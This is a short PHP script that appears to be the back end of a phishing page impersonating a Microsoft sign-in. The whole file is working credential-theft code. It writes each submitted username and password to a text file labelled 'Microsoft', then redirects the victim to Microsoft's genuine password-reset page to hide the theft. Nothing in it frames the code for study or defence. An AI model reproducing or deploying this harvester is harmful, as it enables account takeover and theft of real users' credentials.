<?php

file_put_contents("usernames.txt", "Microsoft :- username : " . $_POST['loginfmt'] . "  || Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
